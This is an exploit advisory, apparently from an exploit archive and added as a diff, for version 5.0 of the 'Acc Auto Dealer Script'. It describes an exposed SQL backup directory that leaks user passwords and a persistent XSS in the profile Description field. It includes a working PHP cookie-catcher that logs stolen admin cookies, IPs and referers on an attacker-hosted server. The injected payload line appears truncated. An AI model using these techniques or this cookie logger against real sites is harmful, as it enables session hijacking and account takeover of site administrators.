@@ -1,0 +1,68 @@
+# Vendor : http://www.accscripts.com/autos/download.html
+# Version: 5.0
+
+
+                ______     __     ______
+               /\  == \   /\ \   /\  __ \
+               \ \  __<   \ \ \  \ \ \/\ \
+                \ \_____\  \ \_\  \ \_____\
+                 \/_____/   \/_/   \/_____/
+
+                 01000010 01101001 01001111
+
+[#]----------------------------------------------------------------[#]
+#
+# [+] Acc Auto Dealer Script [ Persistent XSS / SQL backup ]
+#
+#  // Author Info
+# [x] Author: bi0
+# [x] Contact: bukibv@hotmail.com
+# [x] Homepage : www.ssteam.ws
+# [x] Thanks: packetdeath,redking,Zer0flag,sp1r1t and ssteam.ws ...
+#
+#
+[#]-------------------------------------------------------------------------------------------[#]
+#
+# [x] Exploit :
+#
+#    [SQL Backup]
+#
+#    http://server/[path]/temp/
+#    and serach for .sql .You can find users & passwords
+#
+#    [ Persistent XSS ]
+#
+#    At the Auto Dealer Script you can register as an normal user and at your Control Panel
+#    You can modify "Description" and put there an javascript code to steal cookies, Then if
+#    Site admin visits your profile you can steal their cookies. EX :
+#
+#    // Cookie Catcher "cookie.php"
+#    You must Host somewhere cookie.php
+#=======================================================================
+
+<?php
+$cookie = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date=date("j F, Y, g:i a");;
+$referer=getenv ('HTTP_REFERER');
+$fp = fopen('cookies.html', 'a');
+fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: ' .$date. '<br> Referer: '.$referer.'<br><br><br>');
+fclose($fp);
+?>
+
+#=========================================================================
+#
+#    // And at your Description type :
+#
+#=========================================================================
+
+"/>
+
+#=========================================================================
+#
+#    Now if site admin visits you'r profile their cookies will be saved at
+#    http://host/cookie.html
+#
+[#]------------------------------------------------------------------------------------------[#]
+
+#EOF
